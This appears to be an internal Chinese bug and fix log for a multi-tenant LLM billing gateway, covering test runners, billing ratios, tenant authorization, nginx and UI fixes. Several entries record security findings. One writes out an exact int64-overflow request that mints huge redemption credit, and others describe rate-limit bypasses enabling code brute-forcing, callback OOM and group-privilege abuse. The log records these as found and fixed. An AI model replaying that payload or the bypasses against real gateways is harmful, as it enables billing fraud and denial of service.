- **现象**：要给前端测试加 CI，但 `web/default` 无 `test` npm 脚本、无 vitest 配置、`vitest` 根本没装（`bun.lock` 0 命中）；5 个测试文件却分两派——3 个 `import from 'node:test'`+`node:assert/strict`，2 个 `import { describe, it, expect } from 'vitest'`。没有任何单一常规命令能同时跑通两者（`vitest run` 缺依赖/配置；`node --test` 不认 vitest 写法）。
- **根因**：测试文件历史上分批加入、用了两种框架写法，但因从没进过 CI（见上条），没人配统一 runner；`vitest` 未安装 → `import from 'vitest'` 只能靠运行器的别名解析才能跑。
- **解决/规避**：**`bun test`** 是唯一能同时跑通的命令——bun 内建实现 `node:test`，又会自动把 `vitest` import 别名到 `bun:test`，且原生按目录发现 `*.test.ts(x)`、原生转译 TS/TSX，无需任何配置。实测 `cd web/default && bun test` → **79 pass / 0 fail across 5 files**（含那个 `.tsx`——它是纯逻辑断言、不 render DOM，故无需 happy-dom/jsdom 环境）。已定为 CI 与 preflight 的前端测试命令。
- **升级**：新增前端测试统一用 `bun test` 跑；写法用 `node:test` 或 `vitest` 皆可（bun 都兼容），但**别引入 `vitest` 依赖/配置**制造"看起来该用 vitest 却没装"的迷惑。

---

## 三、业务逻辑

> 多租户识别、计费扣费、用户组倍率、成本保护、收益分润、渠道中继、认证隔离等业务 Bug。

### [已解决] relay 编排顺序：详设与任务书不一致（模型权限 vs 风控先后）
- **现象**：detailed-design §2.11 文字写"鉴权→租户→**模型权限→风控**→…"，而 `tasks/11-relay.md` 写"…→**风控→模型**→…"，Worker 实现按任务书（风控先）。
- **根因**：两份文档措辞不一致。
- **解决/规避**：统一为 **风控先于模型权限**（先做便宜的状态/限流拦截，再查模型权限），已据此修订 detailed-design §2.11/§3.1；risk 模块内部顺序为 状态→IP→RPM（限流置末，避免对已拒请求计数）。
- **升级**：已统一文档；编排顺序写入 api-contract.md 调用链说明。

### [待确认] tokenplan 种子缺 agent_cost_price / min_price
- **现象**：proposal §8.2 套餐表只给 售价/原价/月限额/成本估算，缺**代理成本价**与**零售保护线**两列，而 tokenplan 计费/保护线需要。
- **根因**：需求表未含该两列。
- **解决/规避**：Worker 按默认派生 `agent_cost = base×0.8`、`min_price = agent_cost×1.1`（seed.go 常量，主站后台可覆盖），先跑通。
- **升级**：`[待确认]` —— 需用户给真实代理成本价/保护线口径；对应 progress.md 待确认 #5/#6 同批确认。

### [已解决] RETAIL_BELOW_MIN 错误码映射与"不吞码"原则的张力
- **现象**：tokenplan.SetListing 把 pricing 守卫返回的 `PRICE_BELOW_PROTECTION` **映射**为本域 `RETAIL_BELOW_MIN`，与 §6.4"跨模块错误原样上浮、不吞码"略有张力。
- **根因**：同一保护线被不同域消费，前端希望拿到域内稳定码（tokenplan 页显示"低于套餐保护价"）。
- **解决/规避**：刻意取舍——域边界做一次语义映射（保留原错误为 cause，可 errors.Is 解包），并在 api-contract.md 错误码表标注映射关系。
- **升级**：约定"跨域映射须保留 cause 且在契约表登记"，已记入 api-contract.md。

### [已解决-临时] Slice 1 用 cmd 层临时 `site_configs` 表服务品牌字段
- **现象**：`GET /api/tenant/current` 要返回 `site_name/logo_url/theme_color/footer_text`，但 `tenant.Tenant` 实体只有 slug/status，这些品牌字段归属 **SiteConfig** 模块。
- **根因**：Slice 1 只接了 tenant 模块的 GORM repo，SiteConfig 模块的 GORM repo 尚未接入。
- **解决/规避**：cmd/server 装配层临时建了个小 `site_configs` 表 + demo seed，先跑通管道。
- **升级**：`[待 Slice 2/3]` 接 SiteConfig 模块真实 GORM repo，`/api/tenant/current` 改为 join `tenant + tenant_site_configs`；临时表届时移除。

### [已解决] 前端菜单可见性必须镜像后端鉴权范围（代理自助露给了所有登录用户）
- **现象**：「代理自助」菜单（套餐上架/推广/兑换码/我的用户/用户组 + 我的收益）对**所有登录用户**可见（前端只 gate 了"登录"）。普通用户、代理在主站/别人站点进去就撞后端 `AGENT_FORBIDDEN`「无权访问该代理资源」401。
- **根因**：自助端点后端是 `AgentOwnerAuth`（Host 租户 owner==当前用户）守的，但**前端菜单/路由没有对应这个范围**——可见性与鉴权脱节。
- **解决**：加只读信号 `GET /api/tenant/agent-context`(UserAuth)→`{is_agent_owner}`（直读 Host 租户 owner）；侧栏加 `agentOwnerOnly` 维度按它过滤（loading 期 fail-closed 隐藏）；自助路由加 `beforeLoad`→非 owner `redirect /403`。实测：普通用户 0 项菜单 + 直接 URL 跳 403；代理在自己站 6 项。
- **升级**：**凡是后端按特殊范围(owner/角色/租户)守的功能，前端菜单与路由守卫必须用对应的后端信号同范围门控**，不能只判"登录"；可见性脱离鉴权 = 用户撞 403 的糟糕体验。

### [已解决] new-api 默认把 vip 暴露成"所有人可自选分组"（分组越权 + 计费风险）
- **现象**：任意普通用户建 API Key 时可自选 `vip` 分组并真的用上（享 0.8x 低价），无需管理员分配。`svip`/`kiro` 却正确受限（"无权访问 X 分组"）。
- **根因**：`setting/user_usable_group.go` 硬编码默认 `userUsableGroups = {default, vip}` —— vip 被当成公共可自选分组。中继校验 `GetUserUsableGroups(userGroup)`（=全局 UserUsableGroups + 用户自身 group），vip 在全局表里 → 谁都能用。
- **解决**：把 `UserUsableGroups` 选项固化为仅 `{"default":"默认分组"}`（运行期 `PUT /api/option` 已改，并固化进 `internal/mtwire/seed.go` 首次初始化）。效果：用户只能用**管理员分配给他的分组**（`GetUserUsableGroups` 总会补上用户自身 `User.Group`）；vip/svip/kiro 等高级分组一律"管理员后台配渠道 + 设 User.Group 分配"。实测：chanuser1(default) 自选分组只剩 default、旧 vip token 调用被拒；admin 设 kirouser=kiro → 路由到 kiro 渠道(claude)。
- **子坑**：直接 `UPDATE users SET group=...` 改分组**不刷用户缓存**（`GetUserGroup` 读 `GetUserCache`），relay 仍读旧分组；**必须走 admin API `PUT /api/user/`** 才会刷新。改用户属性一律走 API，不直改 DB。
- **升级**：**新增/启用任何"高级分组"后，确认它不在 `UserUsableGroups` 自选表里**（默认仅 default）；高级分组只能管理员分配。属计费越权红线。

### [Phase 1 已完成] 2D 倍率（层级 × 模型分组）—— 计费交互 + 调试坑
- **做了什么**：计费倍率升级二维相乘（见 `doc/detailed-design.md` §2.15）。`grouphook.ModelGroup2DResolver`（mtwire 注入）在 `HandleGroupRatio` 算 `GetGroupRatio(UserGroup层级) × (IsModelGroup(UsingGroup) ? GetGroupRatio(UsingGroup) : 1)`；`model_groups` 登记表标记模型分组；admin API `/api/admin/model-groups` CRUD 同步 GroupRatio+UserUsableGroups；后台「模型分组管理」页。实测：vip×claude-kiro=0.24、default×claude-kiro=0.3、admin default=1，全对。
- **关键交互（Phase 2 必处理）**：`HandleGroupRatio` 优先级 = ①租户覆盖 `TenantGroupRatioResolver`（命中即返）→ ②2D → ③原生兜底。所以**代理租户对某组的 markup 覆盖会抢在 2D 前生效**：chanuser1 在 tokendream（tenant_groups 有 default=1.5）→ default token 走 markup=1.5、claude-kiro token 走 2D=0.3（无该组覆盖）。Phase 1 此交互"覆盖优先、按组各管各"已知且可接受；**Phase 2 代理参与时要把 markup 与 2D 组合（按组合下限保护）并重定优先级**。
- **调试坑**：① `tenant_groups` 列名是 **`group_name` 不是 `group`**（`SELECT \`group\`` 静默返空，配合 `CONCAT` 遇 NULL 返空更难发现）——查多租户分组覆盖用 `group_name` 或 `SELECT *\G`。② mtwire `New()` 预热模型分组缓存早于 `Migrate()` 建表，启动有一条 `Table doesn't exist` 报错但无害（迁移后重载）；Phase 2 可调 New/Migrate 顺序消除。

### [已解决] 2D 上线后两个 UX/数据坑：建Key下拉露层级 + 代理 owner 落错租户
- **坑1 · 建Key分组下拉露 default/vip**：`GetUserGroups`(self/groups) 默认显示**全部可用分组**（含层级 default + 用户自身 group 如 vip）+ **原生倍率**（不含租户覆盖）。2D 下用户建 Key **只该选模型分组**、且应看**实际扣费倍率**。修：新增 `grouphook.ModelGroupDropdownResolver`（mtwire 注入），`GetUserGroups` 据此**只保留模型分组**（IsModelGroup）、倍率改 **2D 有效值**（层级×模型分组覆盖）。钩子未装配则维持原生。
- **坑2 · 代理 owner 的 tenant_id 错落注册租户（甚至别人的店）**：owner 在某租户域名下注册→`users.tenant_id` 是那家；建代理只设 `tenants.owner_user_id`，**没改 owner 自身 tenant_id**。结果 owner 自用错按那家租户的覆盖计费（agentdemo owner 落在 tokendream，自用走了 tokendream 的 0.5）。用户确认 **Option B（owner 自用按主站基准/进货价）**。修：`HandleAdminCreateAgent` 设 **owner.tenant_id=0**（+ 一次性 `UPDATE users JOIN tenants` 修存量）。效果：owner 自用走平台基准×自身层级、不受任何代理覆盖；只有其名下用户(tenant_id=该店)享代理加价。
- **测试启示**：验代理覆盖**要用真正属于该租户的用户**（在代理域名下注册→tenant_id=该店），别用 owner 账号（owner=平台基准）。
- **升级**：**代理 owner 自身一律 tenant_id=0（平台基准）；代理覆盖只对其名下用户生效。** 建Key下拉只列模型分组、显 2D 有效扣费倍率。
- **坑3 · 渠道编辑「分组」字段沿用原生"用户组"语义**：原生文案"可以访问此渠道的用户组" + 下拉列**全部分组**（含层级），但 2D 下渠道分组=**模型分组**（路由用），不是用户组/层级。修（仅前端 channel-mutate-drawer）：文案改"此渠道服务的模型分组"、标签→「模型分组」；下拉数据源从 `getGroups`(全部) 换 `getModelGroups`(`GET /api/admin/model-groups`)只列已登记模型分组。**升级：凡 new-api 原生 UI 里"分组/用户组"的文案与下拉，2D 下都要审一遍——区分"层级(计费)"和"模型分组(路由)"。**（遗留：tag 批量编辑/表格筛选仍用全量分组、其它语言文案未改，属后续。）

### [已解决] 弹窗打不开的真根因是「插槽式布局丢弃非slot子节点」（不是 Dialog 组件！耗了 3 次尝试）
- **现象**：代理「设置层级」+ 提现/充值/推广渠道新建等**所有弹窗点了不打开**（无 `[role=dialog]`、无 console 报错）。误以为是 base-ui `Dialog` 组件 bug，改动画(`data-open:animate-in`→`data-starting-style`)无效、部署后仍不开。
- **真根因**：`components/layout/components/section-page-layout.tsx` 是**插槽式复合组件**——`Children.forEach` 只渲染 `.Title/.Actions/.Content/.Breadcrumb` 这些插槽，**其它直接子节点被静默丢弃**。坏页把弹窗当 `<SectionPageLayout>` 的**裸直接子节点**渲染（与 `.Content` 平级）→ 整个弹窗子树被过滤、**从不挂载** → 受控 `open` 无组件可驱动。正确写法见 wallet(弹窗放 `</SectionPageLayout>` 外 Fragment)/tenant-plans(放 `.Content` 内)。"Sheet 能开/Dialog 不能"是巧合(能开的恰好渲染在插槽内；兑换码的 Sheet 同样被丢弃)。
- **解决**：让 `SectionPageLayout` 把非 slot 子节点也渲染出来（收集到 `extras` 数组、`<Main>` 末尾 Fragment 渲染）。一处修复修好 4 页全部弹窗。**本地 dev+prod playwright 实测弹窗能开**后才部署。
- **教训**：①弹窗"点了没反应、无报错" → **先查它是否被父布局/插槽组件丢弃**（DOM 里有没有挂载），别一头扎进弹窗组件本身。②难查的运行期 bug 用**本地 dev server + playwright 最小复现**对照（裸组件 vs 真实页），比纯静态分析/反复部署快得多。③我误判过一次(动画)、提交了无效 fix(0c0f0d3)——运行期问题必须运行期验证。

### [已解决] LLM/Codex 大请求体 413（nginx client_max_body_size）
- **现象**：用户在 Codex 配代理站 base_url+key 调 `/v1/responses` → `413 Request Entity Too Large`（nginx 返），账户有钱、非计费问题。
- **根因**：nginx.conf http 级 `client_max_body_size 50m`，通配 vhost 继承；Codex 带大代码上下文/文件，请求体 >50MB（实测 60MB→413、2MB→通过）。CF 免费版上限 100MB，故落在 50–100MB。
- **解决**：通配 + api-443 vhost **server 块内**加 `client_max_body_size 200m`（实测 60MB→401 通过）。**坑：`sed '/server_name/a'` 误匹配注释里的 "server_name" 导致重复指令 + 插到 server 块外 → nginx -t 失败**；改用精确匹配 `^[[:space:]]*server_name .*;$`（行首缩进+分号，排除注释）。仓库 `deploy/nginx/` 副本同步。
- **升级**：LLM 网关 vhost 必设较大 `client_max_body_size`(≥CF 上限)；改 nginx 用 sed 插入务必精确匹配、避开注释，且 `nginx -t` 过了才 reload。

### [已解决] 新模型没配价 → `model_price_error`（与端点/Codex 无关）
- **现象**：Codex(`/v1/responses`) 调 gpt-5.5 失败，user 以为是端点/Codex 问题、以为 Cherry(`/v1/chat/completions`) 能通是端点差异。
- **真根因**：gpt-5.5 没配 ModelRatio → new-api 转发前拦 `400 model_price_error`。**两个端点报的是同一个错**（复现确认）——与 Codex 无关。现网栈压根没 gpt-5.5 渠道，所以 Cherry"能通"是连了别的已配价模型/直连上游。
- **解决**：经 `PUT /api/option/`（会刷内存缓存，**别直接改 DB**）合并写入 ModelRatio/CompletionRatio。
- **计费换算（关键）**：new-api 约定 `ModelRatio=1 ↔ $2/1M`（QuotaPerUnit 默认 500000：1M tokens × ratio × groupRatio / 500000 = $）；2D 下 **groupRatio 会再乘模型价**。要让客户实付价=P（如 openai-plus 组 ×0.5、目标 gpt-5.5 输入$2/输出$12）：`ModelRatio = P_输入÷2÷groupRatio = 2÷2÷0.5 = 2`、`CompletionRatio = P_输出÷P_输入 = 12÷2 = 6`。实测扣费 $0.008954 = 图价，验证准确。
- **升级**：①加新模型/渠道后必到「系统设置→分组与模型定价」配 ModelRatio(+CompletionRatio)，否则 `model_price_error`。②定"客户实付价"时记得**先除以该模型分组的 groupRatio**再换算 ModelRatio。③调试上游调用先复现**两个端点**对比——同错=非端点问题。④**按次价 ModelPrice 也乘 groupRatio**（price.go:136 `modelPrice×QuotaPerUnit×GroupRatio`，图像模型再乘 ImagePriceRatio）：要客户实付 $0.062/次、组×0.5 → ModelPrice=0.124。⑤**改渠道 models 别用 GET+PUT**：`GET /api/channel/:id` 不返回 key（返回空），PUT 回去会抹掉上游 key。安全做法：直接改库 `channels.models` + 删 `abilities` 对应行，再 `docker restart` app 重载路由（abilities 表才是路由真源）；改完务必复验「保留的模型仍 200 + 删掉的模型 model_not_found」。

### [已解决] codex 用 zstd 压缩请求体 → new-api 不解 → `invalid JSON request body`（挖了很久）
- **现象**：codex 调任何模型都 `400 Invalid request: invalid JSON request body`（`middleware/distributor.go:217` 的 `gjson.ValidBytes` 失败），但我直接 curl 简单 body 200、Cherry 也"能用"。
- **逐步排除**：不是大小（直连 50KB→200、200KB 是上游慢超时非解析错）、不是 gzip（gzip body 直连→200，说明 new-api 本就解 gzip）、不是 nginx（仿造 codex 式 body 经 nginx→200）。
- **真根因（靠本地抓包确认）**：起本地 HTTP 日志服务器、把 codex `base_url` 临时指过去，抓到 codex 请求头 **`Content-Encoding: zstd`**——codex 用 **zstd** 压缩请求体。`middleware/gzip.go` 的 `DecompressRequestMiddleware` 只解 `gzip`/`br`、**没有 zstd 分支** → 分发层读到原始 zstd 字节 → `gjson.ValidBytes` 失败。CF/nginx 不解请求体 zstd。
- **解决**：`middleware/gzip.go` 加 `case "zstd"`（`klauspost/compress/zstd`，已是依赖，转直接）。部署后 codex 全部模型经 `/v1/responses` 实测 PONG ✅。
- **教训**：①`invalid JSON request body` 类错误**先查 `Content-Encoding`**（gzip/br/**zstd**/deflate）——服务端是否解得了客户端的压缩方式。②抓不到包时（docker 端口转发路径），**起本地日志服务器 + 把客户端 base_url 指过去**是抓真实请求(头+体)最干净的办法。③现代客户端(codex)默认 zstd 压请求体，LLM 网关务必支持解压 zstd。

### [已解决] 改模型分组名要全栈一起改（分组名=路由键），否则模型广场空
- **现象**：在「系统设置→分组定价」把分组改名（claude-kiro→claude），模型广场里分组显示出来了但**0 个模型**。
- **根因**：分组名是**路由键**，散落 6 处——`GroupRatio`(倍率)、`UserUsableGroups`(可选分组)、**`channels.group`(路由真源)**、`abilities`、`model_groups`、`tokens.group`。「分组定价」页**只改 GroupRatio+UserUsableGroups**，没动渠道侧 → 新名无渠道(无模型)、旧名变孤儿(不可选)。还顺带把 default/vip/svip 三个层级从 GroupRatio 删了 → 2D 层级计费废。
- **解决**：改名要上述 **6 处一起改**（一条 SQL 事务）；层级倍率(default/vip/svip)必须留在 GroupRatio。
- **供应商（模型广场按 OpenAI/Anthropic 分组）**：`vendors` 表存供应商(name 唯一+lobehub 图标名)，**`models` 表的 `vendor_id`** 关联模型；模型必须**登记进 models 表并设 vendor_id** 才会在广场归到供应商下（models 表空则广场无供应商分组）。
- **升级**：①「分组定价」里只改倍率**值**是安全的；改分组**名**必须走全栈 SQL（6 处）。②删渠道前想清楚——**同上游 key 的另一渠道可直接补上同样的模型**（改 `channels.models`+`abilities`+重启），不必重加渠道/重填 key（codex刀 id1 被删后，用同 key 的 codex刀pro id2 补全了 gpt 模型）。③改库后必 `docker restart` app 重载 abilities/options/models 缓存。

### [已解决] 6e 违禁词接入 new-api：原生已有 AC 敏感词 + live 链是 `controller/relay.go` + `dto.Request` 不暴露消息
- **现象**：要在 /v1 转发前扫「用户输入」违禁词，但不知挂哪、怎么拿到用户消息。
- **根因/发现**：①new-api **原生已自带**敏感词（`service/str.go` Aho-Corasick 引擎 + `service/sensitive.go` + `setting/sensitive.go`，go.mod 已有 `anknown/ahocorasick`），但**全局/仅拦截/不记录**，满足不了多租户+remind+审阅。②**live /v1 链是 `controller/relay.go`**——`internal/relay.Gateway` 是设计好但**休眠**（`NewGateway` 无人调、gateway.go 自注 TODO），别挂错；原生敏感词检查在 `controller/relay.go:~136`（扫 `meta.CombineText`）。③`dto.Request` 接口只暴露 `GetTokenCountMeta/IsStream/SetModelName`，**不暴露消息**；`TokenCountMeta` 只有 `CombineText`（含 system/assistant）。要「仅用户输入」必须**按格式类型断言**：`*dto.GeneralOpenAIRequest.Messages`(role==user→`ParseContent()`)、`*dto.OpenAIResponsesRequest.Input`(json.RawMessage，自解析 string/数组)。
- **解决**：复用原生 AC **范式**（模块内自带 `goahocorasick`，不 import 原生 service，§1.4）；在 `internal/moderation` 建多租户/remind/记录；hook 走 **`internal/platform/agenthook`** 包级 var（`ScanUserInput`，原生 relay 调、mtwire `InstallHooks` 注入、nil 回退——避免 native→mtwire import 环）；`controller/relay.go` 原生敏感词检查后加一段调用（小原生改动）。
- **升级**：①接 /v1 旁路逻辑一律走 `agenthook` 包级 var，别在原生包 import mtwire。②改原生 relay 前先确认 live 链是 `controller/relay.go`（不是休眠的 `internal/relay.Gateway`）。

### [已解决] 主站买家端点(套餐购买/充值)在主站 Host 上报 TENANT_NOT_FOUND —— 主站也直销，不该报错
- **现象**：管理员/用户在主站（`www.wedreamhub.com`，非租户）点「个人套餐购买」报「租户不存在」；充值同因。`HandleListTokenPlans/HandlePurchase/HandleListSubscriptions/HandleWalletRecharge` 都写死 `tenantFrom(c)==nil → TENANT_NOT_FOUND`，而主站在 `tenant_domains` 里没有对应行。
- **根因**：这几个买家端点只认 Host 中间件解析出的租户，没有"主站自己也是卖家"这个分支——但产品侧已确认主站自身直销 tokenplan 套餐 + 接受直充。
- **解决**：新增 `App.resolveBuyerTenant(c)`（`http.go`）：已解析租户→原样返回；未解析但命中 `tenant.IsMainSiteHost`（`internal/tenant/resolver.go`，7e8360b 引入的三态判别）→ 回退到 `seedPlatformTenant`（`seed.go`）幂等建的 "platform" 租户（owner=首个管理员，不建 `agent_profiles`，不出现在代理列表）；都不是→维持 `TENANT_NOT_FOUND`。`HandleTenantRechargeMethods` 未在报告里点名，但前端把它当成充值卡渲染开关（失败即隐藏整卡），同一根因，一并修。
- **子坑 1（差点漏改的另一半）**：`seedPlatformTenant` 给平台租户挂了个 owner（root），而 `callerOwnedTenant`(→`HandleAgentContext`) 与 `AgentOwnerAuthByUser`(agent-self 路由组真实鉴权闸门) 都靠 `TenantByOwner` 反查"这个用户拥有哪个租户"——两处都会把 root 误判成"拥有一个代理租户"，前端会给管理员展示整套代理自助菜单，后端也会真的放行管理员对平台租户发起提现等 agent-self 操作。**只排除 UI 信号(callerOwnedTenant)、不排除真实鉴权闸门(AgentOwnerAuthByUser)= 门面式修复**——两处必须用同一个 `isPlatformTenant(t)` 判定同时收口。
- **子坑 2（单测踩过一次的 nil-panic）**：`httptest.NewRequest` 不显式设 `req.Host` 时默认给 `"example.com"`；而 `tenant.IsMainSiteHost` 对"不在 `*.wedreamhub.com` 下的外部域名"有意兜底 `true`（本地直连/开发场景）。二者一叠加，一个零值 `&App{}`（`TenantRepo==nil`）的既有测试走到新加的主站回退分支时对 `nil` 的 `*gormrepo.Repo` 调用方法，直接 panic。修法：`resolveBuyerTenant` 对 `a.TenantRepo==nil` 短路直接判 `TENANT_NOT_FOUND`（沿用 `grouphook.go` 里已有的同款防御惯例），不是改测试凑合过。
- **升级**：①任何新增/复用"Host 未解析出租户"分支的 handler，都要过一遍 `tenant.IsMainSiteHost` 三态，不能自己再造一版主站判定。②新代码只要调用 `TenantByOwner` 反查"用户拥有的租户"，必须过 `isPlatformTenant` 排除——已有 `callerOwnedTenant`/`AgentOwnerAuthByUser` 两个封装可直接复用，不要绕开它们直连 `TenantRepo.TenantByOwner`。③给这类"主站兜底"逻辑写单测，零值 `&App{}` 一定要么补齐依赖、要么显式设 `req.Host` 避开 `example.com` 默认值。

### [已解决] `webgl3d` 类晚于首次量尺 → `display:none` 下 `clientWidth=0` → 渲染缓冲 0×0（灯泡对真实用户全空）
- **现象**：`bulb-orbit/index.html` 的 `initBulb3D()` 原始顺序先调 `onResize3D()` 再 `document.body.classList.add('webgl3d')`；此时 `#bulb3d` 仍 `display:none`，`canvas.clientWidth===0`，`renderer.setSize(0,0,false)`/`composer.setSize(0,0)` 把 WebGL 绘图缓冲区永久锁定 0×0——PNG 回退灯泡又已被 `body.webgl3d` 规则隐藏，真实用户打开页面（不手动缩放窗口）看到的中央区域完全空白，比替换前（总能看到 PNG 灯泡）更差。
- **根因**：`display:none` 元素的 `clientWidth`/`clientHeight` 恒为 0，量尺必须发生在切换为可见之后；无头 Chrome 截图工具的 `--window-size` 在渲染开始后才应用到真实窗口，会顺带触发一次"意外" `resize` 事件，掩盖了这个问题，使当时的 CLI 截图看起来正常（掩盖了 bug 的副作用，不是 bug 不存在）。
- **解决**：把 `document.body.classList.add('webgl3d')` 挪到 `onResize3D()` 之前，四个数值参数不变，仅调整语句顺序（commit `7627945`）。
- **升级**：`display:none` 元素的尺寸量测恒为 0，必须先切换显示再量尺；验证此类时序 bug 须用固定视口、全程零 resize 的会话（如 playwright 显式设视口后不触发原生 resize 事件）——无头截图工具的隐式 resize 会掩盖真实用户场景下才会暴露的 bug。

### [已解决] 键盘点亮（Enter/空格）未同步触发 3D 核心喷发——新交互只挂了 pointerdown 捕获
- **现象**：鼠标/触屏点击点亮灯泡时会触发 3D 核心喷发（灯丝脉冲+辉光+点光闪烁），但键盘 Enter/空格点亮时喷发不播，与「键盘可触发，与鼠标/触屏等效」的既定规格（`bulb-orbit/交互修改文档.md` §八、设计稿 §6）不符。
- **根因**：新增的核心喷发触发只接了 `pointerdown` 捕获段监听，主脚本原有的键盘点亮路径（`keydown` → `ignite()`）不产生 `pointerdown` 事件，两条触发路径互不相通。
- **解决**：对称地追加一个 `keydown` 捕获段监听（`(e.key==='Enter'||e.key===' ') && body.classList.contains('pre')` 时调用同一个 `surge()`），与 pointerdown 分支并列、互不干扰（commit `ad315f6`）。
- **升级**：给既有交互补充新效果时，必须先枚举该交互的**全部**触发入口（鼠标/键盘/触屏），逐一确认新效果都挂上了，不能只对齐看得见的主入口。

### [已解决] 实体网格在「加法粒子 + 亮度转 alpha」构图里两类穿帮：暗色网格冲出黑框洞、白色小网格成生硬光条
- **现象**：粒子灯泡上线后用户放大截图反馈两处瑕疵——①灯泡中心一根生硬的白色竖条；②「点 击 点 亮」上方的点云底座里有多个硬边黑色方框（bulb-orbit，2026-07-07 下午）。
- **根因**：两个从 yun 原样移植的程序化配件在我们的透明画布构图里穿帮。①白条=程序化**灯丝**（白色小圆柱 + Bloom 增亮），yun 里被密集点云与较小屏占掩住，我们的构图里裸露成光条；②黑框=**金属灯座**（暗色 `MeshStandardMaterial`，`transparent:true` 但 `depthWrite` 默认 `true`）：透明排序中它先绘制并写深度，把身后的加法粒子按 z 剔除，叠加「亮度转 alpha」合成（暗像素→低 alpha→透明）后，在发光底座上冲出圆柱侧影形状的硬边黑洞。yun 是不透明深底+屏占小，同一配件不显眼。
- **解决**：删除灯丝与金属灯座两个网格（点云自带灯泡+底座形状，核心喷发改由辉光+点光承担）；顺带给辉光 Sprite 补 `depthWrite:false`，防自旋时透明排序翻转打出同类方洞。
- **升级**：在「加法混合粒子 + 透明画布 + 亮度转 alpha」的场景里：装配用的辅助网格一律显式 `depthWrite:false`；暗色实体网格慎用（暗色=透明，只会以"剔除别人"的方式留下负空间）；从别的项目移植视觉装配时，逐件在**目标构图与目标屏占**下过目，不能只信来源项目的观感。

### [已解决] auto 统一分组对用户被 2D 计费"故意"禁用；vip/svip 折扣走层级轴而非 GroupGroupRatio
- **现象**：想让用户走 "auto" 一个统一入口自动路由 gpt-pro/gemini/kiro，但建 Key 下拉根本没有 auto；且一度以为 vip/svip 折扣要配「分组的分组倍率」(GroupGroupRatio)。
- **根因**：本 fork 装了 2D 计费旁路 `resolveModelGroup2D` 后，`relay/helper/price.go:HandleGroupRatio` 命中即 return、**绕过原生 GroupGroupRatio(对 /v1 计费是死代码)**；`controller/group.go:GetUserGroups` 又**故意把 auto 排除出下拉**(源码注释"2D 装配时也排除")。折扣其实挂在层级轴 `GroupRatio[vip]/[svip]`(线上 0.9/0.8)，用户选任意模型分组都生效、与 auto 无关。auto 另需 `options.UserUsableGroups` 含 "auto" 才过 `middleware/auth.go:413` 鉴权(否则 403「无权访问 auto 分组」)。
- **解决/规避**：移除 group.go 的 auto 排除守卫 + DB `UserUsableGroups` 加 `"auto":"自动(auto)"`(写库**必须 `mysql --default-character-set=utf8mb4`**，否则 latin1 连接把中文双重编码成乱码)。commit 722361c / deploy-20260714-020004；实测 group=auto 令牌 → /v1 gpt-5.5 → 200 命中 gpt-pro、计费正常。计费数学零改动。
- **升级**：记入 memory `billing-2d-and-auto-group`；DB 变更非 git，整库重建需重跑该 UPDATE。

### [已解决] 代理兑换码 int64 乘法溢出绕过唯一付费闸门（Critical，$0.001 铸天价额度）
- **现象**：`POST /api/tenant/redemptions {"amount_usd":997121301281.5974,"count":37}` 可让代理 owner 钱包只实扣 506 quota（≈$0.001），却铸出 37 张 × $997 亿面额的兑换码，兑换进自己名下用户后无限调 /v1，上游账单由平台承担；报表/对账全程"正常"（钱确实扣了、码确实入账了，破的是"面额从哪来"这个前提）。
- **根因**：`HandleAgentCreateRedemptions`（`internal/mtwire/distribution.go`）里 `amount_usd` **只有下界没有上界**，`perCode`（=usd×QuotaPerUnit）与 `Count`（≤1000）各自过校验，但二者乘积 `total := perCode * int64(Count)` **无 int64 溢出检查**——回绕成小正数（506）后穿过仓储层 `CreateCodesWithDeduction` 里 `totalQuotaUnits <= 0` 这道**代理唯一的付费闸门**。溢出发生在 **create 侧的 `perCode×count`**（不是 redeem 侧的 credit：单张面额受 `amount_usd decimal(20,8)` 列宽约束 ≤~$1e12 → perCode ≤~5e17 < int64 max，单码入账不溢出）。曾被三个子代理独立看漏：两个误信源码 `model/user.go` 的 `gorm:"type:int"` 判定 users.quota 是 INT32 会撞 MySQL 1264 回滚（**线上实为 bigint**，AutoMigrate 不收窄已存在列），一个把溢出位置错认在 redeem 侧 credit。**只有实测线上 schema + 亲自算穿整条链才定得了案**。
- **解决/规避**：纵深防御三闸——① 建码侧加面额上界 `maxRedemptionAmountUSD = 1_000_000`（正常业务远低于此，平台历史最大用户额 ≈$203；任何 <~$1.8e13 的上界都使乘积远离溢出边界）；② `total` 计算后加 int64 乘法溢出检测 `total/int64(Count) != perCode`（数学兜底，防日后调大上界）；③ `RedeemCodeAndCredit`（`internal/wallet/gormrepo/gormrepo.go`）入账前加 `amt > MaxInt64/quotaPerUnit` 兜底拒（前瞻性，防列宽放宽/旁路建码）。回归测试 `TestHandleAgentCreateRedemptions_RejectsOverflowMint`（精确利用载荷被拒、owner quota 分文不动、零码落库、界内合法请求仍放行）+ `TestRedeemCodeAndCredit_RejectsOverflowCredit`。服务器 golang:1.25.1 容器 `go build`/`go vet`/`go test ./internal/mtwire/ ./internal/wallet/...` 全绿。**代码仅在本地 git 工作树（未提交/未部署，待用户决定）**。
- **升级**：候选升级为硬约束——"一切'金额×数量/倍率'的 int64 乘法在校验后、落库前必须做溢出检测；面额/数量类入参一律双边界（下界+上界）"。待用户确认后填入 CLAUDE.md C 段；记入 memory `redemption-int64-overflow-mint`。

### [已解决] 自研 mt-router 全部路由旁路 /api 分组中间件——限流默认开着却对自研接口全失效（Critical，兑换码可爆破 / 回调可 OOM / 无限印钞可脚本化）
- **现象**：全局限流（`GLOBAL_API_RATE_LIMIT_ENABLE=true` 360/180s）与关键限流（`CRITICAL_RATE_LIMIT_ENABLE=true` 20/20min）默认都开着，但对所有自研 `/api/**` 端点**一条都不生效**。三条具体暴露：① `POST /api/tenant/redeem` 无限流→登录态每秒数千次爆破他人未用兑换码，`RedeemCodeAndCredit` 直接入账；② `POST /api/pay/wechat/notify`（+ alipay）公开未认证、无 `AnonymousRequestBodyLimit`→任意人 POST 1GB body，`VerifyNotify` 读全量→内存耗尽 OOM；③ `POST /api/tenant/wallet/recharge` 无限流→无限造 pending 订单（DoS + 支付表膨胀）。子代理复现独立 gin 工程实测：`/api/user/topup` apiRouter 中间件命中=1，`/api/tenant/redeem`=0（旁路）。
